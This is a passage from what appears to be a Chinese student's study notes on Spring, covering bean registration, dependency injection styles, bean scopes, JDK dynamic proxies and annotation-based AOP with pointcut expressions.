关键：要继承@Componentpublic @interface Processor &#123;    String value() default &quot;&quot;;&#125;//原来注解的类型是@interface 和接口差不多，需要继承@Component来实现接口// 使用自定义注解@Processor(&quot;order&quot;)public class OrderProcessor &#123; &#125;  // 会被扫描到\n\n\n\n3.@Bean注册为Bean然后我们知道，这个被指定为配置类的类是可以和xml配置文件完全替换的，如果我们扫描的包中缺少了某个类的时候我们也可以选择在配置类中去创建一个Bean\n如果一个Bean不在我们自己的package管理之内，例如ZoneId，如何创建它？\n答案是我们自己在@Configuration类中编写一个Java方法创建并返回它，注意给方法标记一个@Bean注解：\n@Configuration@ComponentScanpublic class AppConfig &#123;        // 方法1：直接返回实例    @Bean    public UserService userService() &#123;        return new UserServiceImpl();    &#125;        // 方法2：带参数（Spring 会自动注入）    @Bean    public OrderService orderService(UserService userService) &#123;        return new OrderServiceImpl(userService);    &#125;        // 方法3：复杂对象的创建    @Bean    public DataSource dataSource() &#123;        HikariDataSource ds = new HikariDataSource();        ds.setJdbcUrl(&quot;jdbc:mysql://localhost:3306/test&quot;);        ds.setUsername(&quot;root&quot;);        ds.setPassword(&quot;123456&quot;);        ds.setMaximumPoolSize(20);        return ds;    &#125;&#125;\n\nSpring对标记为@Bean的方法只调用一次，因此返回的Bean仍然是单例。\n使用方式\n@Autowiredprivate UserService userService;  // 注入的是 UserServiceImpl\n\n\n\n然后就是Spring boot中会比Spring项目方便一点，不一定需要AppConfig去设定加载哪些包\nSpring boot会自动扫描你主启动类（@SpringBootApplication）所在包及其所有子包中的 Bean。@SpringBootApplication不一定修饰主类，但是一般都是这么写的\n我们在主类中这么写\n@SpringBootApplicationpublic class DemoApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(DemoApplication.class, args);    &#125;&#125;\n\n于是就会自动扫描主类包中的Bean\n2.使用注解定义BeanSpring 提供了几类注解来标记类，使其可以被扫描并注册为 Bean：\n\n\n\n注解\n作用\n\n\n\n@Component\n通用组件，最基础的注解，标记类为 Spring Bean\n\n\n@Service\n标记在业务逻辑层类上（语义化）\n\n\n@Repository\n标记在 DAO 或持久层类上，同时会处理异常转换\n\n\n@Controller\n标记在 Web 控制器类上（Spring MVC 使用）\n\n\n@RestController\n相当于 @Controller + @ResponseBody，用于 REST API\n\n\n关于Spring的业务层和控制层还不知道有什么区别，但意思就是这些注解都可以将类注册为Bean\n我们还需要知道，当类被通过注解注册为Bean的时候，默认id是类名的首字母小写，class是注册为Bean的那个类，虽然使用注解也不需要通过id和类型获取bean了\n示例\nimport org.springframework.stereotype.Service;@Servicepublic class UserService &#123;    public String getUserName() &#123;        return &quot;Alice&quot;;    &#125;&#125;\n\n然后在配置类中（或启动类）启用组件扫描：\nimport org.springframework.context.annotation.ComponentScan;import org.springframework.context.annotation.Configuration;@Configuration@ComponentScan(basePackages = &quot;com.example&quot;) // 扫描包下的所有 @Component 类public class AppConfig &#123;&#125;\n\n这里 @ComponentScan 会告诉 Spring\n“请去 com.example 包下找所有带 @Component、@Service、@Controller、@Repository 的类。”进行组件扫描然后注册为Bean\n有时候我们需要自己创建某些第三方类（比如 DataSource、工具类等），可以这样：\nimport org.springframework.context.annotation.Bean;import org.springframework.context.annotation.ComponentScan;import org.springframework.context.annotation.Configuration;@Configuration@ComponentScan(basePackages = &quot;com.example&quot;)public class AppConfig &#123;    @Bean    public MyUtils myUtils() &#123;        return new MyUtils(&quot;工具类初始化&quot;);    &#125;&#125;\n\n这样就是因为第三方工具不在我们的项目中，我们需要通过@Bean注解添加上，具体怎么使用我感觉我遇不到\n3.抽象类和接口注册为Bean我刚才看代码才发现问题，好像我们之前使用依赖注入和注册为Bean的时候使用的都是类，没有接口和抽象类。于是看来一下才发现，接口和抽象类也是可以注册为Bean的。\n如果是接口的话，没有实现方法，肯定是不能获取到Bean的，于是我们需要👉 在容器中找到一个“具体实现类的 Bean”，然后把“引用”注入到接口或抽象类类型的变量中\n也就是说：\n\n接口 &#x2F; 抽象类：作为“依赖的类型声明”\n具体类：作为“真正被实例化的 Bean”\nSpring 做的是：类型匹配 + Bean 选择 + 注入引用\n\n于是实际上注册为Bean的并不是接口，而是该结构的实现类。\npublic interface UserService &#123;    void login();&#125;//一个普通的接口\n\n先对其进行实现\n@Servicepublic class UserServiceImpl implements UserService &#123;    public void login() &#123;        System.out.println(&quot;login&quot;);    &#125;&#125;\n\n然后就可以通过Autowired进行注入，实际上注入的是实现类，只不过实现类也属于接口类型\n@Componentpublic class UserController &#123;    @Autowired    private UserService userService;    //注意，我们可以通过Bean注入实现类    @Autowired    private UserServiceImpl userServiceImpl;&#125;\n\n你注入的是 UserService（接口）， 但 Spring 实际注入的是 UserServiceImpl 的对象。\n一个接口可以有多个实现Bean\n我们可能会有疑惑，就是一个接口可以有多个实现类。这多个实现类是不是都可以注册为Bean，如果都注册为Bean的话，注入接口类型的时候是不是会有冲突。\n实际上的话是不会的，Spring提供了多种方法来消除歧义。\n我们先对一个接口提供两个实现类\npublic interface PayService &#123;    void pay();&#125;@Servicepublic class AliPayService implements PayService &#123;&#125;@Servicepublic class WeChatPayService implements PayService &#123;&#125;\n\n此时IoC容器中有两个bean\naliPayService   -&gt; AliPayServiceweChatPayService -&gt; WeChatPayService\n\n\n\n如果我们直接进行注入的话\n@Autowiredprivate PayService payService;\n\n会找到有多个Bean存在二义性，产生报错\nNoUniqueBeanDefinitionException\n\n\n\n消除歧义的方案\n方案1：@Qualifier（最清晰、最推荐）\n@Autowired@Qualifier(&quot;aliPayService&quot;)private PayService payService;\n\n可以直接在注入的时候指定注入哪个\n方案2：@Primary（默认实现）\n@Primary@Servicepublic class AliPayService implements PayService &#123;&#125;@Autowiredprivate PayService payService; // 自动选 AliPay\n\n可以提前设置注入接口类型时的实现类\n方案3：List注入和Map注入\n这两个注入都可以同时接收多个对象，虽然可能和想要实现的效果有点不一样\n@Autowiredprivate List&lt;PayService&gt; payServices;//会直接得到 [AliPayService, WeChatPayService]@Autowiredprivate Map&lt;String, PayService&gt; payServiceMap;//得到的是&#123;  &quot;aliPayService&quot; -&gt; AliPayService,  &quot;weChatPayService&quot; -&gt; WeChatPayService&#125;\n\n\n\n\n\n4.定制Bean我们已经基本上学会了大多是Bean的注册了。\n我之前看到Spring中每一个类注册为Bean后，只需要启动的时候实例化一次，然后每一次注入使用的都是同一实例\n我之前就在想，使用同一个实例，那岂不是吧不同代码对bean的修改会被保留，那岂不是乱套了。我们有没有什么方法可以注入的时候创建一个新对象（那不是和new一样了吗，虽然可以依赖注入方便一点）\n答案是可以，我们只需要在注册为bean的时候使用@Scope进行修饰就可以让这个bean在注入的时候都创建一个新的实例\n我们称默认注册为bean的bean为Singleton。使用@Scope注册的称为Prototype（原型）\n@Component@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE) // @Scope(&quot;prototype&quot;)public class MailSession &#123;    ...&#125;\n\n然后GPT和我说Singleton是bean的正确形式，百分之99的请况都使用的是Singleton。需要使用到新实例的请况还是自己new一个出来。\n由于Singleton是所有注入都共用一个实例，所以我们要避免在代码中使用对属性进行修改\n在使用 singleton Bean 时：\n\n👉 要避免修改「与请求 &#x2F; 用户 &#x2F; 业务流程相关的可变状态属性」\n👉 但并不是“完全不能有属性”\n\n我们可以使用const和final修饰属性，避免被代码修改\nprivate final int timeout;private final String apiKey;\n\n\n\n\n\n\n\n5.@Autowired注入使用注解定义Bean之后，获取到Bean也很简单，只需要使用@Autowired即可\n我们先来看一下@Autowired的源码\npackage org.springframework.beans.factory.annotation;import java.lang.annotation.Documented;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;@Target(&#123;ElementType.CONSTRUCTOR, ElementType.METHOD, ElementType.PARAMETER, ElementType.FIELD, ElementType.ANNOTATION_TYPE&#125;)//表示注解可以使用的地方@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface Autowired &#123;    boolean required() default true;&#125;\n\n源码中有两处需要注意：\n\n第一处：该注解可以标注在哪里？\n\n\n构造方法上\n方法上\n形参上\n属性上\n注解上\n\n\n\n\n第二处：该注解有一个required属性，默认值是true，表示在注入的时候要求被注入的Bean必须是存在的，如果不存在则报错。如果required属性设置为false，表示注入的Bean存在或者不存在都没关系，存在的话就注入，不存在的话，也不报错。\n\n\n使用方法就是直接在属性前面使用，会自动判断类型然后从Bean中去查找目标类\n1.属性注入使用@Autowired进行属性注入时，直接对一个对应类型的属性进行修饰就能获取到对应的对象\n@Autowiredprivate UserService userService;\n\n注意：\n\n最简洁但最不推荐（Spring团队已不推荐）\n缺点：无法声明final、难以测试、隐藏依赖关系\n仅适合简单原型或非核心代码\n\n2.Setter注入我们先来了解一下什么是标准的set方法\n命名规范\nset方法在命名的时候以set开头，setXXX。当然不这么写编译器也不会报错\npublic void setName(String name) &#123;    this.name = name;&#125;\n\n参数限制\nset方法被发明的时候明确指出是用来对单个属性进行赋值的方法，于是标准的set方法只有一个参数。这样写在使用的时候就十分方便。\npublic User setName(String name) &#123;    this.name = name;    return this;&#125;//这是用于链式调用的set方法//使用方法，可以在定义对象的时候直接链式调用    public static void main(String[] args) &#123;        User user = new User()            .setName(&quot;张三&quot;)    // 返回User对象            .setAge(25)        // 继续调用            .setEmail(&quot;zhangsan@example.com&quot;);                // 等价于：        User user2 = new User();        user2.setName(&quot;张三&quot;);        user2.setAge(25);        user2.setEmail(&quot;zhangsan@example.com&quot;);    &#125;\n\n虽然参数通常只有一个，但是写多个也不会出现语法错误\n// 以下都是非标准的 ❌public void setUser(String name, int age) &#123;  // 多个参数    this.name = name;    this.age = age;&#125;public void setName() &#123;  // 无参数    this.name = &quot;default&quot;;&#125;\n\n\n\n然后Setter注入其实就是一种方法注入，但是要单独把Setter注入拿出来的原因是，set命名规则和作用可以规范代码用来赋值，而不是各种不规范的各种方法进行赋值，这会使得代码难以阅读和维护。\n于是，即使Setter方法名字不对，参数不止一个，甚至功能不对都不会影响编译，只是写代码时人为的规则。\n@Servicepublic class OrderService &#123;    private PaymentService paymentService;        @Autowired    public void setPaymentService(PaymentService paymentService) &#123;        this.paymentService = paymentService;    &#125;&#125;\n\n使用的时候直接对参数进行注入\n3.构造方法注入和set方法注入一样，都是属于方法注入。在调用构造方法的时候进行注入。\n我们要知道，我们进行依赖注入的目的是将Bean中的各种属性通过依赖注入来获取到，但是我们只有Bean能进行依赖注入。于是我们在写代码的时候就需要使用到依赖的类和被使用的类都注册为Bean交给Spring进行管理。\n之前使用context进行获取Bean对象不是特别常用的方法，context一般用在main等基础方法的时候用来获取到末端的Bean。\n我们主要是了解一下使用构造方法注入的优势\n不可变性（Immutability）\n@Componentpublic class OrderService &#123;    // final字段：构造后不可变    private final OrderRepository orderRepository;    private final PaymentService paymentService;    private final AuditLogger auditLogger;        // 构造器确保所有依赖在对象创建时就位    public OrderService(OrderRepository orderRepository,                       PaymentService paymentService,                       AuditLogger auditLogger) &#123;        this.orderRepository = orderRepository;        this.paymentService = paymentService;        this.auditLogger = auditLogger;    &#125;        // ✅ 业务方法可以安全使用依赖，无需null检查    public Order processOrder(OrderRequest request) &#123;        // 不需要 if (orderRepository == null)        return orderRepository.save(processPayment(request));    &#125;&#125;\n\n\n\nSpring4.3+自动推断，也就是说在Spring4.3+以上我们的构造方法Spring会自动帮我们进行注入，构造方法进行重载的时候就需要通过Autowired指定哪个进行依赖注入\n// 从Spring 4.3开始，单构造器可省略@Autowired@Componentpublic class UserService &#123;    private final UserRepository userRepository;        // 不需要 @Autowired 注解！    public UserService(UserRepository userRepository) &#123;        this.userRepository = userRepository;    &#125;&#125;// 多个构造器时需要明确指定@Component  public class ComplexService &#123;    private final Repository repo;    private final Calculator calc;        @Autowired  // 必须明确指定用哪个构造器    public ComplexService(Repository repo, Calculator calc) &#123;        this.repo = repo;        this.calc = calc;    &#125;        public ComplexService(Repository repo) &#123;  // 这个不会被使用        this(repo, new DefaultCalculator());    &#125;&#125;\n\n于是我们可以得出，我们在加载Bean的时候其实一切都是在这个IoC容器中进行处理，也就是说只要是在Spring容器中想要获取到Bean就不需要new，直接注入就行了，其他非Bean的时候再new。\n但是假如我们再构造的时候需要获取到一些参数比如string这些非Bean的参数，我们该如何传入参数呢，按理来说在自动化的Spring容器中我们是不能自己传入参数的。\n✅ 正确做法：@Value 或配置类\npublic A(    @Value(&quot;$&#123;service.url&#125;&quot;) String url,    @Value(&quot;$&#123;service.timeout&#125;&quot;) int timeout) &#123;&#125;\n\n这两个参数的值 **来自 Spring 的 Environment**， 而 Environment 中的数据 来自各种 PropertySource（配置源）。\n于是我们在写代码都是时候尽量不要在Bean中写一些需要传入的参数\n4.方法注入方法注入就没有那么多规矩了，直接通过Autowired对参数进行注入就行了\n@Componentpublic class DataProcessor &#123;    private DataSource dataSource;    private Validator validator;        @Autowired    public void prepareComponents(DataSource dataSource, Validator validator) &#123;        this.dataSource = dataSource;        this.validator = validator;    &#125;&#125;\n\n\n可以一次性注入多个依赖\n方法名任意，Spring会调用所有带@Autowired的方法\n\n5.可选注入默认情况下，当我们标记了一个@Autowired后，Spring如果没有找到对应类型的Bean，它会抛出NoSuchBeanDefinitionException异常。\n可以给@Autowired增加一个required = false的参数：\n@Componentpublic class MailService &#123;    @Autowired(required = false)    ZoneId zoneId = ZoneId.systemDefault();    ...&#125;\n\n这个参数告诉Spring容器，如果找到一个类型为ZoneId的Bean，就注入，如果找不到，就忽略。\n这种方式非常适合有定义就使用定义，没有就使用默认值的情况。\n5.面向切片：AOP我们先来看一下普通代码的使用，在设计一个方法的时候，我们往往会加上这些非业务逻辑组件。\n\n日志\n权限校验\n事务\n性能统计\n异常处理\n\n然后我们来看一个类中实现一个日志功能\npublic class CalculatorLogImpl implements Calculator &#123;        @Override    public int add(int i, int j) &#123;            System.out.println(&quot;[日志] add 方法开始了，参数是：&quot; + i + &quot;,&quot; + j);        int result = i + j;        System.out.println(&quot;方法内部 result = &quot; + result);        System.out.println(&quot;[日志] add 方法结束了，结果是：&quot; + result);                return result;    &#125;        @Override    public int sub(int i, int j) &#123;            System.out.println(&quot;[日志] sub 方法开始了，参数是：&quot; + i + &quot;,&quot; + j);        int result = i - j;        System.out.println(&quot;方法内部 result = &quot; + result);        System.out.println(&quot;[日志] sub 方法结束了，结果是：&quot; + result);            return result;    &#125;        @Override    public int mul(int i, int j) &#123;            System.out.println(&quot;[日志] mul 方法开始了，参数是：&quot; + i + &quot;,&quot; + j);        int result = i * j;        System.out.println(&quot;方法内部 result = &quot; + result);        System.out.println(&quot;[日志] mul 方法结束了，结果是：&quot; + result);            return result;    &#125;        @Override    public int div(int i, int j) &#123;            System.out.println(&quot;[日志] div 方法开始了，参数是：&quot; + i + &quot;,&quot; + j);        int result = i / j;        System.out.println(&quot;方法内部 result = &quot; + result);        System.out.println(&quot;[日志] div 方法结束了，结果是：&quot; + result);            return result;    &#125;&#125;\n\n我们可以看到，明明是相同的操作，但是却需要在每个方法中写多个重复的代码。\n问题来了：\n\n每个方法都要写一遍\n改规则要改 N 处\n业务代码被“污染”\n\n👉 这类逻辑的特点是：\n\n横跨多个模块\n不属于核心业务\n\n于是便会出现这些缺陷：\n\n对核心业务功能有干扰，导致程序员在开发核心业务功能时分散了精力\n附加功能分散在各个业务功能方法中，不利于统一维护\n\n解决这两个问题，核心就是：解耦。我们需要把附加功能从业务功能代码中抽取出来。\n1.代理模式想要了解AOP我们得熟悉一下代理模式\n二十三种设计模式中的一种，属于结构型模式。它的作用就是通过提供一个代理类，让我们在调用目标方法的时候，不再是直接对目标方法进行调用，而是通过代理类间接调用。让不属于目标方法核心逻辑的代码从目标方法中剥离出来——解耦。调用目标方法时先调用代理对象的方法，减少对目标方法的调用和打扰，同时让附加功能能够集中在一起也有利于统一维护。\n我们之前写代码的时候常用的方法，比如对数据库进行操作不是每次都执行sql语句，而是将执行各种语句的方法写到一个类里面，要对数据库进行操作的时候调用数据库类的方法就行了。\n使用代理前：\n\n\n使用代理后：\n\n\n\n\n静态代理\npublic class CalculatorStaticProxy implements Calculator &#123;        // 将被代理的目标对象声明为成员变量    private Calculator target;        public CalculatorStaticProxy(Calculator target) &#123;        this.target = target;    &#125;        @Override    public int add(int i, int j) &#123;            // 附加功能由代理类中的代理方法来实现        System.out.println(&quot;[日志] add 方法开始了，参数是：&quot; + i + &quot;,&quot; + j);        // 通过目标对象来实现核心业务逻辑        int addResult = target.add(i, j);        System.out.println(&quot;[日志] add 方法结束了，结果是：&quot; + addResult);            return addResult;    &#125;&#125;\n\n\n\n静态代理确实实现了解耦，但是由于代码都写死了，完全不具备任何的灵活性。就拿日志功能来说，将来其他地方也需要附加日志，那还得再声明更多个静态代理类，那就产生了大量重复的代码，日志功能还是分散的，没有统一管理。\n提出进一步的需求：将日志功能集中到一个代理类中，将来有任何日志需求，都通过这一个代理类来实现。这就需要使用动态代理技术了。\n动态代理\n\n\n不需要像静态代理那样把代码写死，而是通过反射来调用不同方法\n生产代理对象的工厂类：\npublic class ProxyFactory &#123;    private Object target;    public ProxyFactory(Object target) &#123;        this.target = target;    &#125;    public Object getProxy()&#123;        /**         * newProxyInstance()：创建一个代理实例         * 其中有三个参数：         * 1、classLoader：加载动态生成的代理类的类加载器         * 2、interfaces：目标对象实现的所有接口的class对象所组成的数组         * 3、invocationHandler：设置代理对象实现目标对象方法的过程，即代理类中如何重写接口中的抽象方法         */        ClassLoader classLoader = target.getClass().getClassLoader();        Class&lt;?&gt;[] interfaces = target.getClass().getInterfaces();        InvocationHandler invocationHandler = new InvocationHandler() &#123;            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                /**                 * proxy：代理对象                 * method：代理对象需要实现的方法，即其中需要重写的方法                 * args：method所对应方法的参数                 */                Object result = null;                try &#123;                    System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，参数：&quot;+ Arrays.toString(args));                    result = method.invoke(target, args);//通过反射调用方法                    System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，结果：&quot;+ result);                &#125; catch (Exception e) &#123;                    e.printStackTrace();                    System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，异常：&quot;+e.getMessage());                &#125; finally &#123;                    System.out.println(&quot;[动态代理][日志] &quot;+method.getName()+&quot;，方法执行完毕&quot;);                &#125;                return result;            &#125;        &#125;;        return Proxy.newProxyInstance(classLoader, interfaces, invocationHandler);    &#125;&#125;\n\n\n\n测试代码\n@Testpublic void testDynamicProxy()&#123;    ProxyFactory factory = new ProxyFactory(new CalculatorLogImpl());    //获取到代理类然后传入我们需要操作的对象    Calculator proxy = (Calculator) factory.getProxy();    //动态调用方法    proxy.div(1,0);    //proxy.div(1,1);&#125;\n\n\n\n2.AOP的概念及相关术语概念\nAOP（Aspect Oriented Programming）是一种设计思想，是软件设计领域中的面向切面编程，它是面向对象编程的一种补充和完善，它以通过预编译方式和运行期动态代理方式实现，在不修改源代码的情况下，给程序动态统一添加额外功能的一种技术。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。\n相关术语\n①横切关注点\n分散在每个各个模块中解决同一样的问题，如用户验证、日志管理、事务处理、数据缓存都属于横切关注点。\n从每个方法中抽取出来的同一类非核心业务。在同一个项目中，我们可以使用多个横切关注点对相关方法进行多个不同方面的增强。\n这个概念不是语法层面的，而是根据附加功能的逻辑上的需要：有十个附加功能，就有十个横切关注点。\n\n\n于是我们横切就是将同一类非核心业务进行横切，这样就可以通过AOP类进行统一代理\n②通知（增强）\n增强，通俗说，就是你想要增强的功能，比如 安全，事务，日志等。\n每一个横切关注点上要做的事情都需要写一个方法来实现，这样的方法就叫通知方法。\n\n前置通知：在被代理的目标方法前执行\n返回通知：在被代理的目标方法成功结束后执行（寿终正寝）\n异常通知：在被代理的目标方法异常结束后执行（死于非命）\n后置通知：在被代理的目标方法最终结束后执行（盖棺定论）\n环绕通知：使用try…catch…finally结构围绕整个被代理的目标方法，包括上面四种通知对应的所有位置\n\n\n\n\n\n③切面类\n封装通知方法的类。也就是写具体增强功能的类。\n\n\n\n\n④目标\n被代理的目标对象。\n⑤代理\n向目标对象应用通知之后创建的代理对象。\n⑥连接点\n这也是一个纯逻辑概念，不是语法定义的。\n把方法排成一排，每一个横切位置看成x轴方向，把方法从上到下执行的顺序看成y轴，x轴和y轴的交叉点就是连接点。通俗说，就是spring允许你使用通知的地方\n\n\n⑦切入点\n定位连接点的方式。\n每个类的方法中都包含多个连接点，所以连接点是类中客观存在的事物（从逻辑上来说）。\n如果把连接点看作数据库中的记录，那么切入点就是查询记录的 SQL 语句。\nSpring 的 AOP 技术可以通过切入点定位到特定的连接点。通俗说，要实际去增强的方法\n切点通过 org.springframework.aop.Pointcut 接口进行描述，它使用类和方法作为连接点的查询条件。\nAOP的作用\n\n简化代码：把方法中固定位置的重复的代码抽取出来，让被抽取的方法更专注于自己的核心功能，提高内聚性。\n\n代码增强：把特定的功能封装到切面类中，看哪里有需要，就往上套，被套用了切面逻辑的方法就被切面给增强了。\n\n\n3.基于注解的AOP1.技术说明\n\n\n\n\n\n\n\n\n动态代理分为JDK动态代理和cglib动态代理\n当目标类有接口的情况使用JDK动态代理和cglib动态代理，没有接口时只能使用cglib动态代理\nJDK动态代理动态生成的代理类会在com.sun.proxy包下，类名为$proxy1，和目标类实现相同的接口\ncglib动态代理动态生成的代理类会和目标在在相同的包下，会继承目标类\n动态代理（InvocationHandler）：JDK原生的实现方式，需要被代理的目标类必须实现接口。因为这个技术要求代理对象和目标对象实现同样的接口（兄弟两个拜把子模式）。\ncglib：通过继承被代理的目标类（认干爹模式）实现代理，所以不需要目标类实现接口。\nAspectJ：是AOP思想的一种实现。本质上是静态代理，将代理逻辑“织入”被代理的目标类编译得到的字节码文件，所以最终效果是动态的。weaver就是织入器。Spring只是借用了AspectJ中的注解。\n\n2.实现AOP①添加依赖\n在IOC所需依赖基础上再加入下面依赖即可：\n&lt;!--spring aop依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;    &lt;version&gt;6.0.2&lt;/version&gt;&lt;/dependency&gt;&lt;!--spring aspects依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt;    &lt;version&gt;6.0.2&lt;/version&gt;&lt;/dependency&gt;\n\n\n\n②准备被代理的目标资源\n接口：\npublic interface Calculator &#123;        int add(int i, int j);        int sub(int i, int j);        int mul(int i, int j);        int div(int i, int j);    &#125;\n\n实现类：\n@Componentpublic class CalculatorImpl implements Calculator &#123;        @Override    public int add(int i, int j) &#123;            int result = i + j;            System.out.println(&quot;方法内部 result = &quot; + result);            return result;    &#125;        @Override    public int sub(int i, int j) &#123;            int result = i - j;            System.out.println(&quot;方法内部 result = &quot; + result);            return result;    &#125;        @Override    public int mul(int i, int j) &#123;            int result = i * j;            System.out.println(&quot;方法内部 result = &quot; + result);            return result;    &#125;        @Override    public int div(int i, int j) &#123;            int result = i / j;            System.out.println(&quot;方法内部 result = &quot; + result);            return result;    &#125;&#125;\n\n\n\n\n\n创建切面类\n// @Aspect表示这个类是一个切面类@Aspect// @Component注解保证这个切面类能够放入IOC容器@Componentpublic class LogAspect &#123;    //通过execution可以指定增强用于哪些方法    @Before(&quot;execution(public int com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)    //通过Before修饰beforeMethod方法会在增强方法之前调用    public void beforeMethod(JoinPoint joinPoint)&#123;        String methodName = joinPoint.getSignature().getName();        String args = Arrays.toString(joinPoint.getArgs());        System.out.println(&quot;Logger--&gt;前置通知，方法名：&quot;+methodName+&quot;，参数：&quot;+args);    &#125;    @After(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)    public void afterMethod(JoinPoint joinPoint)&#123;        String methodName = joinPoint.getSignature().getName();        System.out.println(&quot;Logger--&gt;后置通知，方法名：&quot;+methodName);    &#125;    //方法执行结束后的注解都需要使用value指定增强方法    @AfterReturning(value = &quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, returning = &quot;result&quot;)    public void afterReturningMethod(JoinPoint joinPoint, Object result)&#123;        String methodName = joinPoint.getSignature().getName();        System.out.println(&quot;Logger--&gt;返回通知，方法名：&quot;+methodName+&quot;，结果：&quot;+result);    &#125;    @AfterThrowing(value = &quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, throwing = &quot;ex&quot;)    public void afterThrowingMethod(JoinPoint joinPoint, Throwable ex)&#123;        String methodName = joinPoint.getSignature().getName();        System.out.println(&quot;Logger--&gt;异常通知，方法名：&quot;+methodName+&quot;，异常：&quot;+ex);    &#125;            //Around一般必须配合ProceedingJoinPoint去控制方法的执行，不然就没有意义了    @Around(&quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;)    public Object aroundMethod(ProceedingJoinPoint joinPoint)&#123;        String methodName = joinPoint.getSignature().getName();        String args = Arrays.toString(joinPoint.getArgs());        Object result = null;        try &#123;            System.out.println(&quot;环绕通知--&gt;目标对象方法执行之前&quot;);            //目标对象（连接点）方法的执行            result = joinPoint.proceed();            System.out.println(&quot;环绕通知--&gt;目标对象方法返回值之后&quot;);        &#125; catch (Throwable throwable) &#123;            throwable.printStackTrace();            System.out.println(&quot;环绕通知--&gt;目标对象方法出现异常时&quot;);        &#125; finally &#123;            System.out.println(&quot;环绕通知--&gt;目标对象方法执行完毕&quot;);        &#125;        return result;    &#125;    &#125;\n\n\n\n然后我们的AOP类也是需要扫描的，如果不扫描@Aspect就不会发挥作用，我们也是可以通过xml文件和注解进行扫描，现在基本上不使用xml了。\n&lt;aop:aspectj-autoproxy /&gt;&lt;bean id=&quot;logAspect&quot; class=&quot;com.example.LogAspect&quot; /&gt;&lt;bean id=&quot;orderService&quot; class=&quot;com.example.OrderService&quot; /&gt;\n\n注解扫描\n@Configuration@EnableAspectJAutoProxy  // 开启 AOP 自动代理@ComponentScan(&quot;com.example&quot;)public class AppConfig &#123;&#125;\n\n\n\n测试代码：\npublic class CalculatorTest &#123;    private Logger logger = LoggerFactory.getLogger(CalculatorTest.class);    @Test    public void testAdd()&#123;        ApplicationContext ac = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        Calculator calculator = ac.getBean( Calculator.class);        int add = calculator.add(1, 1);        logger.info(&quot;执行成功:&quot;+add);    &#125;&#125;\n\n\n\n执行结果：\n\n\n\n\n\n\n3.各种通知\n前置通知：使用@Before注解标识，在被代理的目标方法前执行\n返回通知：使用@AfterReturning注解标识，在被代理的目标方法成功结束后执行（寿终正寝）\n异常通知：使用@AfterThrowing注解标识，在被代理的目标方法异常结束后执行（死于非命）\n后置通知：使用@After注解标识，在被代理的目标方法最终结束后执行（盖棺定论）\n环绕通知：使用@Around注解标识，使用try…catch…finally结构围绕整个被代理的目标方法，包括上面四种通知对应的所有位置\n\n各种通知的执行顺序：\n\nSpring版本5.3.x以前：\n前置通知\n目标操作\n后置通知\n返回通知或异常通知\n\n\nSpring版本5.3.x以后：\n前置通知\n目标操作\n返回通知或异常通知\n后置通知\n\n\n\n4.切入点表达式语法我们已经知道是如何增强方法的了，但是还需要通过execution去指定我们增强的目标方法\n语法细节\nexecution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))\n\n用*号代替“权限修饰符”和“返回值”部分表示“权限修饰符”和“返回值”不限\n\n在包名的部分，一个“*”号只能代表包的层次结构中的一层，表示这一层是任意的。\n\n例如：*.Hello匹配com.Hello，不匹配com.atguigu.Hello\n\n\n在包名的部分，使用“*..”表示包名任意、包的层次深度任意\n\n在类名的部分，类名部分整体用*号代替，表示类名任意\n\n在类名的部分，可以使用*号代替类名的一部分\n\n例如：*Service匹配所有名称以Service结尾的类或接口\n\n\n在方法名部分，可以使用*号表示方法名任意\n\n在方法名部分，可以使用*号代替方法名的一部分\n\n例如：*Operation匹配所有方法名以Operation结尾的方法\n\n\n在方法参数列表部分，使用(..)表示参数列表任意\n\n在方法参数列表部分，使用(int,..)表示参数列表以一个int类型的参数开头\n\n在方法参数列表部分，基本数据类型和对应的包装类型是不一样的\n\n切入点表达式中使用 int 和实际方法中 Integer 是不匹配的\n\n\n在方法返回值部分，如果想要明确指定一个返回值类型，那么必须同时写明权限修饰符\n\n例如：execution(public int ..Service.(.., int))\t正确  例如：execution( int *..Service.(.., int))\t错误\n\n\n\n\n\n\n\n5.重用切入点表达式我们之前是直接在通知注解后面加上我们的execution语句，但是这样就会出现一些问题\n\n切点表达式重复\n一旦包名 &#x2F; 规则变化，要改 N 处\n可读性差\n容易写错（execution 很长）\n\n于是我们可以使用@Pointcut注解去将我们的execution语句写到方法中，其他通知直接使用这个方法就可以得到对应但是execution语句\n//声明@Pointcut(&quot;execution(* com.atguigu.aop.annotation.*.*(..))&quot;)public void pointCut()&#123;&#125;//在同一个切面中使用@Before(&quot;pointCut()&quot;)public void beforeMethod(JoinPoint joinPoint)&#123;    String methodName = joinPoint.getSignature().getName();    String args = Arrays.toString(joinPoint.getArgs());    System.out.println(&quot;Logger--&gt;前置通知，方法名：&quot;+methodName+&quot;，参数：&quot;+args);&#125;//在不同切面中使用，需要通过包名然后去访问到声明方法@Before(&quot;com.atguigu.aop.CommonPointCut.pointCut()&quot;)public void beforeMethod(JoinPoint joinPoint)&#123;    String methodName = joinPoint.getSignature().getName();    String args = Arrays.toString(joinPoint.getArgs());    